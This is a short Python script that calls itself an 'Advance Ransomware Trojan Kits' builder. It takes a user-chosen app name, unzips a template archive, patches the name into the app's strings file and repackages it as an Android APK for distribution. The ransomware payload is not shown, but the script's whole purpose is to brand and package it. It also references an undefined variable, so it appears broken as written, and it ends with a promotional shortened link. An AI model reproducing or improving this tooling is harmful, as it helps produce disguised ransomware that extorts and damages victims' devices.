#! /usr/bin/env python3
import os, sys, time, fileinput
from getpass import getpass
from PIL import Image

r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
gr = "\033[2;37m"
B = "\033[1;44m"
w = "\033[0m"
br = "\033[1;37;41m"
bold = "\033[1m"

app_name = ""

def banner():
	print(f"""{bold}\t ___
\t|[_]| Advance Ransomware
\t|+ ;| Trojan Kits - {br} ARTKs {w}
\t`---'{gr} Developed by: Kitty dev\n""")

def writefile(file,old,new):
    while True:
        if os.path.isfile(file):
            replaces = {old:new}
            for line in fileinput.input(file, inplace=True):
                for search in replaces:
                    replaced = replaces[search]
                    line = line.replace(search,replaced)
                print(line, end="")
            break
        else: exit(r+"[!]"+w+" Failed to write in file "+file)

def start():
    global app_name
    os.system("clear")
    banner()
    while True:
        x = str(input(f"{bold}{r}>>{w} {bold}SET app_name: "+y))
        if len(x) != 0:
            app_name = x
            break
        else: continue
    print(w+"* Building your ransomware APK's ...")
    print(w+"-"*43+d)
    os.system("unzip beta.zip")
    print("I: Using strings "+strings)
    smali = os.popen(f"find -L beta/ -name '*0000.smali'","r").readline().strip()
    print("I: Using smali "+os.path.basename(smali))
    writefile("res/values/strings.xml","appname",app_name)
    print("I: Adding name with "+app_name)
    time.sleep(3)
    os.system("zip final.apk resources.arsc classes.dex AndroidManifest.xml res org META-INF")

if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        exit(r+"\n[!]"+w+" Thanks for Using this tools\n    Join Us All \033[4mhttps://bit.ly/3PV3S3r/033[0m\n    exiting ...")
